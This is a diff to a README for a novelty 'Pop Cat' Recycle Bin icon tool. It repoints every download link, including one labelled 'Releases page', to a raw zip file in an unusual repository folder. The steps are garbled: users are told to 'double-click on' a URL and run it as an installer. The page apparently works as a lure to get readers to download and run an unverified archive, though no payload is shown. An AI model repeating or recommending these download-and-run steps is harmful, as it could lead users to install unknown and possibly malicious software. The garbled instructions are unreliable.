@@ -17,14 +17,14 @@ Welcome to the pop-cat-recycle-bin project! This software transforms your Window
 ## 🔗 Download & Install
 To get started, click the button below to visit the Releases page and download the software.
 
-[![Download pop-cat-recycle-bin](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip)
+[![Download pop-cat-recycle-bin](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip)
 
 ### Steps to Download and Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip).
 2. **Select the Latest Version**: Choose the most recent version of pop-cat-recycle-bin.
-3. **Download the Installer**: Click on the file labeled "https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip" to start the download.
+3. **Download the Installer**: Click on the file labeled "https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip" to start the download.
 4. **Locate the Downloaded File**: Find the installer in your Downloads folder.
-5. **Run the Installer**: Double-click on "https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip".
+5. **Run the Installer**: Double-click on "https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip".
 6. **Follow the Prompts**: Follow the on-screen instructions to complete the installation.
 7. **Enjoy Your New Recycle Bin**: After installation, your Recycle Bin will display the playful Pop Cat icon.
 
@@ -48,4 +48,4 @@ Share your experience with pop-cat-recycle-bin! Let the community know how much 
 ## 🔗 Remember to Download
 Don’t forget to download the software and bring some fun to your Recycle Bin!
 
-[![Download pop-cat-recycle-bin](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/pop-cat-recycle-bin.zip)
+[![Download pop-cat-recycle-bin](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ardakorpev/pop-cat-recycle-bin/main/skeppist/cat-pop-bin-recycle-1.8.zip)
